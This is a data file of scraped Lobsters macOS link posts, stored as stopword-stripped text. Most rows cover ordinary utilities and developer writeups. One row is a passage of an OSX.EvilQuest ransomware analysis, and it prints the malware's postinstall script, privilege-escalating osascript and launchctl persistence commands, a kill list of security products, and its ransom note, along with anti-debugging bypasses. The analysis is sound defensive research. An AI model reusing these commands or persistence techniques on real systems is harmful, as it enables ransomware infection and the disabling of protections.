38,Lobsters,mac,Apple macOS,Unshaky: software utility for macOS laptops with butterfly keyboard double press problems,https://github.com/aahung/Unshaky,unshaky software utility macos laptop butterfly keyboard double press problem,unshaky unshaky user complaint unshaky unshaky keyboard service program macbook macbook pro service program complaint issue howto video walkthrough download file howto download unshakyapp grant accessibility permission input monitoring enough catalina launch startup optional configure delay defective key pick appropriate delay faq visit wiki community localization contributor open issue big community contributor provide translation,unshaky unshaky try address issue butterfly keyboard macbook macbook air macbook pro later double key press see user complaint apple made difficult replace keyboard cost hundred dollar unshaky might save keyboard dismissing second key hit key press occur later x millisecond previous effective one fixed w key unshaky work open issue image illustrates unshaky work june good news apple launched keyboard service program macbook macbook pro go get keyboard fixed maybe temporarily may apple extends service program cover macbook air pro gen butterfly keyboard complaint issue howto video walkthrough click image watch youtube ca nt watch clicking image download file howto download unshakyapp first move unshakyapp application folder grant accessibility permission input monitoring enough catalina follow instruction first open unshaky instruction work go system preference security privacy privacy tab accessibility left panel add unshakyapp make sure checked launch startup optional go system preference user group login item tab add unshakyapp configure delay defective key click unshaky icon menu bar select configure configure delay defective key pick appropriate delay nt think universal delay value people type fast might want shorter delay use m since fast typer long delay type apple second p likely blocked user found m sweet spot issue m suggestion start short delay like m gradually increase faq visit wiki community localization contributor help translate unshaky language open issue prepare related file translation contribution valuable make unshaky accessible user big thank community contributor provide translation
39,Lobsters,mac,Apple macOS,You can install fonts with homebrew?,https://changelog.com/posts/you-can-install-fonts-with-homebrew,install font homebrew,cask font j party live recording,yesterday learned yil thing manually download font find ttf file install via fontbook like animal instead rely homebrew official cask font running brew tap homebrewcaskfonts installing favorite font testing new one easy sunday morning brew cask install fontfiracode want browse font available cask brew search font searching specific font quite remember name grep away brew search font grep fira long time homebrew fanperson probably already knew know know oh strange reason want see actual moment learned fact watch tail end j party live recording yesterday
40,Lobsters,mac,Apple macOS,Return and Enter Are Two Different Keys,https://daringfireball.net/2020/07/return_and_enter,return enter two different key,return enter two different key based notion enter synonym return key key code look keyboard script debugger bbedit shell worksheet,return enter two different key monday july new york time mini crossword clue weekend based notion enter synonym return key two different key usually perform action always keyboard dedicated return key big key thinking right shift key mac key code press return glyph key dedicated enter key generally present extended keyboard numeric keypad key lowerright corner generally oversized key keyboard larger vertically horizontally mac key code glyph look keyboard return key say return enter key say enter keyboard dedicated enter key type enter key pressing fnreturn return key enter printed small type word return keyboard neither dedicated enter key fn modifier key think type enter without resorting return enter usually perform action always tweetbot mac editing tweet return insert newline character enter immediately send tweet script editor script debugger return insert newline enter compile script bbedit shell worksheet return insert newline enter execute current line spreadsheet number return confirm content cell editing move selection next row enter confirm content current cell general rule differ return simply key typing newline character classic mac o literally return character let get whereas enter enters already typed without adding new
41,Lobsters,mac,Apple macOS,Debugging a dynamic linking bug in a Nix project,https://www.johnbcoughlin.com/posts/nix-dynamic-linking/,debugging dynamic linking bug nix project,debugging dynamic linking bug nix project trying nix development experience scientific project nix direnv wrapping c compiler override default petsc derivation nix pill whither linker edit keep filed ticket section installname depravity section helpful blog post gotcha petsc derivation line post epilogue first contribution,debugging dynamic linking bug nix project trying nix development experience day building scientific project contributor ran nasty version conflict two system library fit pique decided learn enough nix able set reproducible tightly controlled local build done overall happy tooling setup using direnv tightly integrate normal shell nix nixshell feature part everything feel seamless extremely refreshing see cmake report found plethora binary library contenthashed installed neat little row nixstore using nix manage development environment build project nix ensures project dependency installed discoverable compiler linker building project done cmake set cmake find nixinstalled library nix achieves wrapping c compiler shell script injecting path library binary via environment variable little make cmake work beyond declaring package want buildinputs first version shellnix file looked like file shellnix pkgs import nixpkgs pkgsmkshell buildinputs pkgs cmake callpackage nixpetscnix metis openmpi package packagesnumpy using setup little trouble getting project build override default petsc derivation compile metis openmpi support hard file nixpetscnix petsc blas gfortran lapack python metis openmpi petscoverrideattrs oldattrs rec nativebuildinputs blas gfortran gfortrancclib lapack python openmpi metis preconfigure export fc gfortran bingfortran gfortran bingfortran patchshebangs configureflagsarray configureflagsarray withmpidir openmpi withmetis metis withblaslib blas liblibblasso gfortrancclib liblibgfortrana withlapacklib lapack libliblapackso gfortrancclib liblibgfortrana nix file return function invoked shellnix using callpackage function petscoverrideattrs neat way override attribute derivation created stdenvmkderivation building petsc mpi metis support simple passing different set argument configure script figuring fun mostly referred nix pill great progression nix tool language nix file able execute cmake make successfully getting project run another story final binary failed immediately dynamic loading error binwarpxm dyld library loaded referenced usersjacksrcwarpxmbuildbinwarpxm reason image found binary trying load dynamic lib one temporary directory nix created process building petsc course failed time invoked binwarpxm directory cleaned instead file privatetmp binary linked result petsc derivation nix store nixstore point seemed environment variable incorrectly set intermediate directory figure would learn lot linking o x ever expected whither linker first checked compiler linker flag inserted nix compiler wrapper come via nixcflagscompile nixldflags working nixshell direnv environment variable derivation injected shell simple matter echoing echo nixcflagscompile isystem echo nixldflags look fine invoking cmake make shell ought pull correct library remembered project us pkgconfig find pull together linked library frankly understand pkgconfig well know project invoked inside cmake search library according rule run nix done job setting everything therefore circumvents compiler linker flag checked happened pkgconfig installed setting nix environment therefore cmake able invoke system pkgconfig user path perhaps system version pkgconfig somehow finding wrong library indeed echo pkgconfigpath confirmed searching directory home thought possible wire got crossed adding dependency nix derivation one time configuring pkgconfig appropriately might help edit since tried pure shell clean path removed something bashrc nixshell source might cause common belief nixshell isolated user installed passing pure flag wrong fact keep user whole path around filed ticket address however using nixshell believe super useful tool even without hermetically isolating development environment referred nix wiki page c project also section using pkgconfig seems including pkgconfig derivation nativebuildinput let package like petsc append output path pkgconfigpath environment variable pkgsmkshell buildinputs pkgs nativebuildinputs pkgs pkgconfig fix problem would go deeper track bad library pulled digging cmake documentation project cmake file led insert trio print statement findpackage pkgconfig required pkgcheckmodules petsc petsc required linkdirectories petsclibrarydirs message petsc library petsclibraries message petsc library dirs petsclibrarydirs message petsc link library petsclinklibraries list append warpxmlinktargets petsclibraries printed three line cmake output petsc library petsc petsc library dirs petsc link library second two look good first library name petsc little implicit comfort precisely variable appended link target list compile time would linker find library petsc sure would look safer use absolute path dylib like list append warpxmlinktargets petsclibraries list append warpxmlinktargets petsclinklibraries thinking wrong sure linker look compile time path listed nixldflags thinking clearly flow data compilation process changing link target absolute path eased mind duration next cmake make cycle surely way linker could screw arcane library search involved absolute path possibly binwarpxm dyld library loaded referenced usersjacksrcwarpxmbuildbinwarpxm reason image found damn installname depravity point absolutely flummoxed every fix attempted grepped vainly offending privatetmp path build directory come emptyhanded tracked final irrevocable link option passed compiler tucked away linktxt file build tree showed incontrovertibly binary linked correct library cat buildsrccmakefileswarpxmdirlinktxt applicationsxcodeappcontentsdevelopertoolchainsxcodedefaultxctoolchainusrbinc dndebug isysroot proved nearly satisfaction cmake right thing library completely idea finally lucky google search led section nix manual describing issue specific darwin macos platform state darwin library linked using absolute path library resolved installname link time sometimes package set correctly causing library lookup fail runtime fixed adding extra linker flag running installnametool id fixupphase matteroffact way stating something understood flabbergasted best understanding happens macos source code include directive include petsch something like creates binary interface satisfied linker link time pas list absolute path library linker find one match interface linker save installname library found binary load section run time binary actually macos dyld system load library installname look certainly gotten aspect wrong would definitely appreciate hearing someone understands better case find pointed concept installname something go searching led helpful blog post describing exactly issue facing also described check installname library otool gotcha nix manual state package set correctly point fix use installnametool change installname built library petsc derivation nixpkgs correctly saw something installnametool prepatch substituteinplace configure replace binsh usrbinpython stdenvliboptionalstring stdenvisdarwin substituteinplace configinstallpy replace usrbininstallnametool installnametool directive replaces appearance string usrbininstallnametool installnametool reason nix package ensure build rely nixbuilt tool provided build shell path binary system directory like usrbin pr introduced substitution indicates fixed build darwin must invocation usrbininstallnametool petsc searching petsc repo lead line exactly mark log post installname instructed change installname absolute path library installation directory using installnametool id ospathsplitext dst dylib ospathisfile usrbininstallnametool output err flg selfexecuteshellcommand otool src oldname output outputfind n installname oldnamereplace ospathrealpath selfarchdir selfinstalldir selfexecuteshellcommand usrbininstallnametool id installname dst according installname library repaired petsc library built notice something second condition statement petsc derivation run prepatch step condition become ospathisfile installnametool certainly fail installnametool going file directory configure running patched configure script silently skip step leaving installname library temporary directory built luckily solution problem hard instead name program path pas absolute path program want run done overriding prepatch step like prepatch substituteinplace configure replace binsh usrbinpython stdenvliboptionalstring stdenvisdarwin substituteinplace configinstallpy replace usrbininstallnametool darwincctools bininstallnametool nix variable darwincctools expand full path built darwincctools derivation directory nixstore patched statement inside petsc configurepy becomes ospathsplitext dst dylib ospathisfile use installnametool installname resulting library correct check otool otool looking much better since error dynamically loaded library even recompile check working build git master binwarpxm dyld loaded usersjacksrcwarpxmbuildbinwarpxm dyld loaded dyld loaded dyld loaded dyld loaded like epilogue spent time debugging problem without working understanding different build phase clear neither cmake pkgconfig setup could cause time invoking cmake offending privatetmp directory long vanished focused exclusively petsc derivation provided nix might homed installnametool patch little sooner went lucky find note nix manual darwinspecific linker problem nix absolutely using remarkable little impact able use manage environment project without impacting way developer manage environment course asked would advocate try nix nice everyone able time also looking forward first contribution nix
42,Lobsters,mac,Apple macOS,httpflow: command line utility to capture and dump HTTP stream,https://github.com/six-ddc/httpflow,httpflow command line utility capture dump http stream,httpflow installation macos linux release usage,httpflow installation macos brew update brew install httpflow linux centos yum update yum install libpcapdevel zlibdevel pcredevel ubuntu debian aptget update aptget install libpcapdev git clone http githubcomsixddchttpflow cd httpflow make make install directly download release binary file usage libpcap version libpcap version httpflow version usage httpflow interface r pcapfile u urlfilter w outputpath expression interface listen interface tcpdump interface r pcapfile read packet file created tcpdump w option standard input used file u urlfilter match url dumped w outputpath write http request response specific directory expression selects packet dumped format tcpdump expression argument filter expression given packet expression true dumped expression syntax see pcapfilter information see http githubcomsixddchttpflow capture default interface use expression filter capture result expression given packet net dumped expression syntax see pcapfilter httpflow host host httpbinorg host baiducom use regexp filter request url httpflow u user read packet pcapfile tcpdump w acap httpflow r acap tcpdump w httpflow r write http request response directory tmphttp
43,Lobsters,mac,Apple macOS,Linux Impressions,https://jorin.me/linux-impressions/,linux impression,let start hardware let talk software firefox alacritty neovim keepassxc kdenlive krita ob studio nice commenter told integration kde file browser package management manjaro aur homebrew ubuntu spectacle tunnelblick basic command line tool configuration arch wiki kde gnome gnome tweak tool alacritty neovim slack firefox desktop icon qt gtk performance conclusion,one year ago still macbook pro work macbook air home thinkpad running manjaro kde dell xps running ubuntu gnome using linux way even started programming last year macos since cool devs use since back two linux machine main conclusion definitely good enough still difference let start hardware still stand touchpad speaker macbook personally thing keyboard though prefer thinkpad dell either use headphone connect external speaker anyways thinkpad impressive amount port hdmi lan sim card usb many two machine mostly usbc headphone adapter dell probably favorite size keyboard touchpad overall feel let talk software notable software use firefox alacritty neovim dropbox spotify keepassxc plus yubikey work also slack docker virtualbox google drive occasionally also use kdenlive krita ob studio steam luckily work system docker feel faster linux probably related u lot volume mounting huge productivity win work since run everything docker google provide linux client google drive enough use web version plus nice commenter told integration kde file browser allows access file transparently also promising open source paid client need access file offline monitor printer bluetooth speaker bluetooth xbox controller worked device far package management installing software big deal system manjaro found software need right available repository also include aur arch linux experience nicer homebrew mac often slowing since updating time nicer apt ubuntu package often outdated nonexistent also like rolling release manjaro big scary upgrade get ubuntu macos also really like setting ui manjarokde configure even switch linux kernel also interesting mac actually install software linux starting homebrew package management spectacle aligning window tunnelblick vpn also many basic command line tool configuration experience macos actually annoying general pretty polished rather annoying issue linux distros also issue enough flexibility enough help online fix especially nice arch wiki using manjaro definitely tweaked setting linux think spent time since simply lot option available work around le issue found thing much easier configure kde gnome gnome definitely want install gnome tweak tool even much le setting many thing configured terminal linux definitely want enjoy freedom theme setup desktop way like small time effort seems totally worth even improves experience staring screen hour every day little bit theme everything apps like alacritty neovim slack firefox desktop icon rather keep effort low since mostly one time thing setup thing happily work vim ssh server day long gladly use gui configure desktop environment kde definitely shine system setting allow search download install theme everything also icon set installed terminal using gnome also relevant kde built top qt gnome built gtk use apps built qt apps built gtk kde nicer job integrating apps gui toolkits also straight forward theme right kde setting performance try benchmarking interesting perceived performance say biggest difference already mentioned docker apart file search editor also starting application definitely faster linux krunner kde also feel faster searching gnome spotlight mac mostly tell difference manjarokde ubuntugnome looking system status see manjarokde consumes le ressources le systemd service running definitely surprise find kde lightweight gnome used different booting system say dell bios seems fastest lenovo thinkpad slowest lenovo prefers like show giant red logo bit longer actual linux distros pretty fast find kde give smoother booting experience manjaro loading screen ubuntu show loading screen second one point macbooks sleep mode closing laptop lid last longer think mac switch hibernate automatically hibernate work linux laptop seems faster rebooting scratch conclusion hope experience report helpful course applies specific use case preference might still takeaway others please reach tell experience preference thought also feel free ask additional info help
44,Lobsters,mac,Apple macOS,"sudo with TouchID and Apple Watch, even inside tmux",http://andre.arko.net/2020/07/10/sudo-with-touchid-and-apple-watch-even-inside-tmux/,sudo touchid apple watch even inside tmux,touchid apple watch even inside install fork sudo custom pam module shared twitter configure use fix named stack overflow answer chrisjohnsen cabel fabianishere reattachtousernamespace tmux reflejo straight c module apple biscuitehh,jul sudo touchid apple watch even inside tmux ever since touchid introduced macbook pro wondered could replace user authentication dialog gui like system preference installer command line thing like sudo perhaps predictably many nerd internet idea could install fork sudo custom pam module get touchid support turn none actually needed though somewhat obscure builtin way enable shared twitter surprisingly apple actually ship pam module named pamtidso every copy macos configure sudo use skip typing password touchid instead without completely destroy security machine unfortunately never worked debugging later figured worked inside regular shell inside shell opened tmux ssh since pretty much exclusively use shell opened tmux ssh spent time frantically googling around fix found pretty much nothing worked outside tmux work inside tmux fast forward three year today griping friend work inside tmux discovered technology advanced fix named pamreattach pam module configure run builtin pamtidso make sudo command able find use touchid module authenticate even inside tmux amazingly even able find written explanation thought process produced pam module form stack overflow answer based answer linked discussion seems step apple patch screen stay attached user gui login session cli tool like pbcopy security system call like touchid check continue work chrisjohnsen us undocumented function called screen patch implement nowubiquitous reattachtousernamespace command allows pbcopy pbpaste continue working inside tmux nonapple screen touchid macbooks emerged cabel reveals existence pamtidso touchid authentication sudo unfortunately work nongui process like ssh tmux homebrewed screen fabianishere inspired apple patch screen sends pull request reenable touchid reattachtousernamespace tmux discussion unfortunate tradeoff pr closed create new pam module analogous reattachtousernamespace pam flow pamreattach enables touchid sudo tmux homebrewed screen macos catalina apple add apple watch confirmation touchid system apple watch configured unlock mac also doubletap watch button confirm touchid prompt instead scanning finger enterprising swift coder reflejo wrote new pam module enable touchid support named pamtouchid implemented swift shorter opinion easier understand straight c module apple biscuitehh content apple watch sudo exclusively mac touchid hardware forked pamtouchid pamwatchid pam module allows sudo via apple watch mac pretty excited finally sudo using fingerprint watch little bit awe way determined nerd manage figure thing eventually nice work everyone
45,Lobsters,mac,Apple macOS,Tiger to Catalina: let’s port some code,https://www.sicpers.info/2020/07/tiger-to-catalina-lets-port-some-code/,tiger catalina let port code,bean much step make xcode happy step remove reference next objectivec runtime diagnose stack smash side quest rationalise version check ship ship see source github,many part modern software stack around long time tradeoff term user experience great thing software incrementally improved providing customer familiarity stability need learn entirely new thing existing thing keep working also great developer mean play red queen always running stand still focus improving customer experience knowing everything wrote date still work still work cocoa example continuous history back code written use cocoa apis going back let port old cocoa software see little effort stay date bean free word processor macos written objectivec using mostly cocoa carbon apis us cocoa text system current version bean free support macos open source version bean support intel powerpc would take make modern cocoa app couple hour work gave fullyworking bean catalina lot unnecessary sidequesting step make xcode happy bean built using o x sdk probably needed xcode xcode o x sdk let build macos sdk instead also accepted whatever suggested updated setting xcode showed enabled fobjcweak flag using automatic reference counting turn deployment target support build run right quite step remove reference next objectivec runtime bean us method swizzling ie swapping method implementation runtime mostly work around difference api behaviour tiger leopard code longer compiles error incomplete definition type struct objcmethod origmethod methodtypes file included note forward declaration struct objcmethod typedef struct objcmethod method reason apple introduced objectivec runtime leopard made impossible directly access data structure used runtime structure stayed header couple release long gone first thought first fix delete code eventually relented wrapped project still build back assuming update sdk setting build cleanly using clang xcode build beta xcode fact ok ship right diagnose stack smash launched crashed straight away stack trace look like thread queue comapplemainthread stop reason excbadaccess frame libmainthreadcheckerdylib checkerc frame libmainthreadcheckerdylib trampolinec frame libmainthreadcheckerdylib handlerstart frame appkit nstextview drawinsertionpointinrect color turnedon frame appkit nstextview drawinsertionpointinrect color turnedon frame appkit nstextview drawinsertionpointinrect color turnedon frame appkit nstextview drawinsertionpointinrect color turnedon frame appkit nstextview nsprivate viewdiddrawinlayer incontext um well definitely good backtrace api code except main top nstextview really changed much get infinite loop try draw cursor actually one many patch appkit app swizzled category nstextview replaces two method see stack trace could change swizzled method see way make work remove side quest rationalise version check everything work app built powerpc mac o x ported early point intel run couple change macos want fix one thing message appears launch would like get rid bean warning gestalt selector gestaltsystemversion returning instead bug gestalt documented limitation use nsprocessinfo operatingsystemversion property get correct system version number call location bean carboncore gestaltsystemversionblockinvoke bean libdispatchdylib dispatchclientcallout bean libdispatchdylib dispatchoncecallout bean carboncore gestaltsystemversion bean carboncore gestalt bean bean jhdocumentcontroller init bean appkit nscustomobject nibinstantiate little history back classic mac o gestalt used like unix programmer use sysctl soda drink maker use high fructose corn syrup want expose information add gestalt bloated enough drink gestalt api take selector pointer memory get written memory depends selector gestaltsystemversion selector make write o version number memory well us bit turned fine apple release many operating system used one octet major minor patch release number macos represented mac o x came along gestalt part carbon api version reported major release bumped first version patch level release jaguar point someone apple realised ever sixteen patch release sixteen minor release would break capped patchminor number told stop using gestaltsystemversion would like stop using lot version number check bean put one place given two way check version nsprocessinfo isoperatingsystematleastversion available use actually never relevant test version api added fall back gestalt separate gestaltsystemversionmajorminor selector exist back perfect fails earliest o bean run actually tell run quits apple added minimumsystem check launch service could use infoplist say whether app work mechanism supported ship done haha kidding done launching thing enough better test dark mode thing tiger thing bean assumes set background nstextview white explicitly set actually ship see source github particularly change needed make cocoa application work macos despite couple cpu family switch bunch change ui
46,Lobsters,mac,Apple macOS,OSX.EvilQuest Uncovered,https://objective-see.com/blog/blog_0x59.html,osxevilquest uncovered,sample background dinesh devadoss ransomwhere part two infection vector tweet thomas reed mixed key analysis virustotal wwwisacaorg blockblock part two conclusion blockblock ransomwhere patreon,osxevilquest uncovered part infection persistence patrick wardle june research tool writing supported friend objectivesee want play along added sample osxevilquest malware collection password infect background early today noted malware researcher dinesh devadoss tweeted new piece macos malware ransomware tendency impersonating google software update program zero detection everyday new piece malwareransomware uncovered target macos moreover ransomwhere tool claim able generically detect threat decided take anlayze malware confirm tool indeed detect priori knowledge first part twopart blog post series discus malware infection vector perform initial triage uncover persistence antianalysis logic part two detect capability insidious threat infection vector dinesh tweet apparent ransomware able infect macos user however thomas reed malwarebytes objective sea speaker noted malware found pirated version popular macos software shared popular torrent site method infection though relatively unsophisticated somewhat common thus indicating least level successful example macos malware spreading via infected torrent include intego researcher found osxshlayer spreading via bittorrent file sharing site appearing fake flash player update user attempt select link copy torrent magnet link ethical reason aside generally unwise install pirated software often infected malware torrent site notorious distributing malware adware sometimes misleading advertisement sometimes trojan horse downloads claim crack may contain infected copy legitimate software intego sample analyzing today packaged pirated version popular dj software mixed key malicious package unsigned macos prompt user allowing opened however macos user attempting pirate software may likely ignore warning pressing onwards ensuring infection commences analysis noted ransomware distributed via trojanzied installers sample dive distributed via disk image named mixed key currently disk image flagged antivirus engine virustotal though likely change av engine update signature database mount disk image via hdiutil utility hdiutil attach downloadsmixed key guidpartitionscheme appleapfs volumesmixed key mounted disk image volumesmixed key contains installer package mixed key l volumesmixed key mixed key favorite tool statically analyzing extracting file package suspicious package opened suspicious package find pirated mixed key application binary named patch clicking postinstall tab find post install script binsh librarymixednkey applicationsutilspatch librarymixednkeytoolroomd applicationutils x librarymixednkeytoolroomd short creating librarymixednkey directory move binary named patch directory set executable launch installer request root privilege install script thus toolroomd binary also run root privilege via dynamic analysis monitoring tool file process monitor passively observe installation process procinfo process start pid path binsh user args binsh usersuserdownloadsmixed key application fsusage w f filesystem mkdir librarymixednkey rename applicationsutilspatch librarymixednkeytoolroomd using suspicious package extract mixed key application binary named patch mixed key binary still validly signed mixed key developer likely pristine unmodified turn attention toolroomd binary toolroomd binary originally called patch unsigned macho executable file patch patch macho executable codesign dvv patch patch code object signed shasum patch patch next run string command string patch systemprivilegeadmin reroot silent noroot ignrp generatexkey toidievitceffelibtpyrctpyrcc bit getprocesslist toidievitceffelibpersistpersistc return tab del esc rightcmd leftcmd leftshift cap leftoption string output find obfuscated string plus appear related command line argument file encryption perhaps keylogging via nm utility dump name symbol including function name nm patch u cgeventgetintegervaluefield u cgeventtapcreate u cgeventtapenable u nsaddressofsymbol u nscreateobjectfileimagefrommemory u nsdestroyobjectfileimage u nslinkmodule u nslookupsymbolinmodule u nsunlinkmodule u nxfindbestfatarch constructplistpath dispatch eirootgainerelevate generatexkey gethostidentifier getprocesslist homestub istarget maketempname mhexecuteheader packtrailer reactexec reacthost reactkeys reactping reactsave reactscmd reactstart rotate tpdecrypt tpencrypt unpacktrailer acquireroot u connect createrescueexecutable eicarvermain eiforensicsendfile eiforensicthread eigethostinfo eigetmacaddr eiloadermain eiloaderthread eipersthread eipersistencemain eireadspot eirootgainermain eirunfile eirunmemoryhrd eirunthread eisavespot eiselfretainmain eibdecode eibencode eibpackc eibsecuredecode eibsecureencode eibstringfa eibstringkey eibunpacki eipdecrypt eipencrypt eipkey eipseeds isdebugging isvirtualmchn lfscdirlist lfscgetcontents lfscmatch lfscpackbinary lfscparsetemplate lfscunpackbinary persistexecutable persistexecutablefrombundle u popen preventtrace ohh plot thickens nm output seen method function name related keylogging cgeventtapcreate cgeventtapenable etc inmemory code execution nscreateobjectfileimagefrommemory nslinkmodule etc antianalysis isdebugging isvirtualmchn survey gethostidentifier getprocesslist etc persistence persistexecutable persistexecutablefrombundle encryption ransom eipencrypt simple piece ransomware time disassembledebug patch binary core logic patch toolroomd binary occurs within main function first par commandline parameter looking silent noroot ignrp silent silent passed via command line set value zero appears instruct malware run silently example suppressing printing error message cmp rbpsilent jnz skiperrmsg lea rdi application run root call printf flag passed eirootgainermain function influence malware running normal user may request root privilege lea rdx rbpsilent lea rcx call eirootgainermain interestingly flag explicitly initialized zero set zero silent specified though appears never set thus malware alway run silent mode even silent specified noroot noroot passed via command line set value one various code within malware check flag set take different action example skipping request root privilege cmp rbpnoroot jnz norequestforroot call eirootgainermain flag also passed persistence function influence malware persisted launch daemon launch agent mov ecx rbpnoroot mov call eipersistencemain ignrp ignrp passed via command line set value one instructs malware persist ignore persistence example eiselfretainmain function persists malware flag checked set function simply return without persisting malware cmp rbpignorepersistence jz leave malware parse command line option executes function named isvirtualmchn exit return true isvirtualmchn exit let take closer look function want make sure detect debugging session virtual machine isvirtualmchn int time sleep argo rax time rdx rax rdx rax rdx return rax code invokes time twice sleep compare difference two call time match amount time system slept detect sandbox patch speedup call sleep sleep patching sandbox patch sleep function try outmaneuver malware us time delay response malware check see time accelerated malware get timestamp go sleep get timestamp wake time difference timestamps duration amount time malware programmed sleep malware know running environment patching sleep function would happen sandbox wwwisacaorg mean reality function sandbox check may detect virtual machine good news debugging effort continuing malware invokes method named extractei attempt read byte trailer data within end however function named unpacktrailer invoked extractei return false check fails appears sample contain required trailer data rcx trailer data cmp dword ptr mov rax jz leave trailer data found sample skip certain persistence logic appears persist daemon rcx trailer data extractei persistexecutablefrombundle installdaemon eistr lbx eistr eistr eistr eistr rundaemonu runtarget appears various value interest u namepath daemon obfuscated however look like eistr function responsible deobfuscation looking decompilation see onetime initialization variable named eibstringkey call function named eibsecuredecode call method named tpdcrypt eistr int eibstringkey eibstringkey eipdecrypt eibstringfa rax strlen rax eibsecuredecode rax eibstringkey rax else rax return rax generally concern detail deobfuscation decryption algorithm simply set debugger breakpoint end function print plaintext string held rax register let least dump decryption key eibstringkey lldb x rdx however downside approach decrypt string malware invokes eistr function debugger breakpoint hit thus encrypted string referenced block code executed ever see decrypted value course want decrypt string know malware obviously decrypt string via eistr function need way convince turn hard simply create injectable dynamic library resolve address malware eistr function invokes anyall encrypted string place logic constructor dynamic library automatically executed library loaded malware code even run wellcommented code injectable dynamic library constructor static void decrypt define resolve malware eistr function typedef char eistr char str eistr eistrfp dlsym rtldmainonly eistr init pointer cstring segment start eistr long char start char eistrfp char end start char current start decrypt sting current end decrypt char string eistrfp current printf decrypted string lx sn unsigned long current string next current strlen current short simply scan entire cstring segment contains encrypted string invoking eistr method encrypted string compile forcefully load malware via dyldinsertlibraries environment variable loaded decryption logic invokes coerces malware decrypt string dyldinsertlibrariestmplibevilquestdecryptordylib librarymixednkeytoolroomd decrypted string decrypted string rettxt decrypted string osascript e beep say waiting completion false set altitle set altext display alert altext message altitle critical button ok set clipboard decrypted string readmenowtxt decrypted string sdesktop decrypted string sdocuments decrypted string spictures decrypted string smovies decrypted string shellperapp decrypted string osascript e shell script sudo administrator privilege decrypted string systemprivilegeadmin decrypted string reroot decrypted string launchctl submit l questd p decrypted string silent decrypted string osascript e shell script launchctl load w launchctl start administrator privilege decrypted string osascript e shell script launchctl load w launchctl start decrypted string idrsa decrypted string pemi decrypted string ppki decrypted string knownhostsi decrypted string cabundlei decrypted string crti decrypted string decrypted string eri decrypted string pfxi decrypted string decrypted string key pdfi decrypted string wallet pdfi decrypted string key pngi decrypted string wallet pngi decrypted string key jpgi decrypted string wallet jpgi decrypted string key jpegi decrypted string wallet jpegi decrypted string hellocruelworld decrypted string memory based bundle decrypted string eirunmemoryhrd decrypted string doctype plist public appledtd plist http plist version dict key label key string string key programarguments key array string sudo string string string string silent string array key runatload key true key keepalive key true dict plist decrypted string wb decrypted string slibrary decrypted string libraryappquestcomapplequestd decrypted string libraryappquest decrypted string slibraryappquest decrypted string slibraryappquestcomapplequestd decrypted string doctype plist public appledtd plist http plist version dict key label key string string key programarguments key array string string string silent string array key runatload key true key keepalive key true dict plist decrypted string questd decrypted string comapplequestdplist decrypted string librarylaunchdaemons decrypted string slibrarylaunchagents decrypted string decrypted string decrypted string q h decrypted string xookc decrypted string osascript e shell script sudo open administrator privilege decrypted string hi decrypted string shcsh decrypted string little snitch decrypted string kaspersky decrypted string norton decrypted string avast decrypted string drweb decrypted string mcaffee decrypted string bitdefender decrypted string bullguard decrypted string comapplequestd decrypted string ookcucythguan decrypted string installerapp decrypted string setup decrypted string ignrp decrypted string user decrypted string noroot decrypted string ignrp decrypted string sncspot decrypted string decrypted string important file encrypted many document photo video image file longer accessible encrypted maybe busy looking way recover file waste time nobody recover file without decryption service use aes algorithm take billion year break encryption without knowing key read wikipedia aes nt believe statement anyways guarantee recover file safely easily require u use processing power electricity storage side fixed processing fee usd onetime payment additional fee included order accept offer deposit payment within hour day receiving message otherwise offer expire lose file forever payment deposited bitcoin based bitcoinusd exchange rate moment payment address make payment decryption start automatically within hour payment processed take hour depending processing power computer file restored offer valid hour receiving message decrypted string decrypted string file encrypted decrypted string many important document photo video image file longer accessible encrypted maybe busy looking way recover file waste time nobody recover file without decryption service guarantee however recover file safely easily cost usd without additional fee offer valid day starting full detail found file readmenowtxt located desktop decrypted string readmenow decrypted string tar decrypted string rar decrypted string tgz decrypted string zip decrypted string decrypted string dmg decrypted string gz decrypted string jpg decrypted string jpeg decrypted string png decrypted string gif decrypted string psd decrypted string eps decrypted string decrypted string decrypted string mov decrypted string avi decrypted string mkv decrypted string wav decrypted string aif decrypted string aiff decrypted string ogg decrypted string flac decrypted string doc decrypted string txt decrypted string docx decrypted string xl decrypted string xlsx decrypted string page decrypted string pdf decrypted string rtf decrypted string decrypted string csv decrypted string djvu decrypted string epub decrypted string pub decrypted string key decrypted string dwg decrypted string c decrypted string cpp decrypted string h decrypted string decrypted string php decrypted string cgi decrypted string cs decrypted string sc decrypted string sas decrypted string otf decrypted string ttf decrypted string asc decrypted string c decrypted string vb decrypted string asp decrypted string ppk decrypted string crt decrypted string decrypted string pfx decrypted string decrypted string dat decrypted string hpp decrypted string ovpn decrypted string download decrypted string pem decrypted string number decrypted string keynote decrypted string ppt decrypted string aspx decrypted string html decrypted string xml decrypted string json decrypted string j decrypted string sqlite decrypted string pptx decrypted string pkg decrypted output find many revealing string appear address command control server regexes file interest relating key certificate wallet idrsa key pdfi wallet pdf property list file launch item persistence security product little snitch kaspersky de ransom instruction target file extension continuing analysis specimen appear contain trailer data code block mentioned skipped malware invokes function named eipersistencemain also persists malware however persistence eipersistencemain function invokes various antidebugging logic attempt thwart dynamic debugging specifically first call function named isdebugging isdebugging method implemented address check debugged invokes sysctl ctlkern kernproc kernprocpid getpid returned check ptraced set infokppro structure returned sysctl common antidebugger check seen macos malware isdebugging function return true malware exit call isdebugging cmp eax jz continue mov edi call exit subvert debugger simply set breakpoint change value rax register false thread queue comapplemainthread stop reason breakpoint cmpl eax je movl edi callq target patch stopped lldb reg read rax rax lldb reg write rax lldb c good almost malware contains antidebugging logic function called preventtrace seek prevent tracing debugging via call ptrace ptracedenyattach flag preventtrace proc near push rbp mov rbp rsp call getpid xor ecx ecx mov edx ecx addr xor ecx ecx data mov edi request mov esi eax pid call ptrace pop rbp retn preventtrace endp bypass simply avoid call preventtrace together however simply set breakpoint call function modify value instruction pointer rip skip lldb b breakpoint patch patch address lldb c process resuming process stopped thread queue comapplemainthread stop reason breakpoint callq leaq rip rdi movl esi movl eax rbp target patch stopped lldb reg write rip lldb c easy peasy continue dynamic analysis unperturbed name suggests eipersistencemain function persists malware launch agent however persisting invokes function named killunwanted kill several well known security product may detect block malicious behavior killunwanted function get list running process compare process encrypted list unwanted program aforementioned breakpoint eistr function dump decrypted string ascertain value unwanted program lldb x rax little snitch lldb x rax kaspersky lldb x rax norton lldb x rax avast lldb x rax drweb lldb x rax mcaffee lldb x rax bitdefender lldb x rax bullguard day objectivesee tool make list ha finally eipersistencemain function persists malware specifically first call persistexecutable function creates persistent copy observe via file monitor andor debugger first observe malware decrypting various string related persistence lldb x rax libraryappquestcomapplequestd lldb x rax slibraryappquestcomapplequestd malware 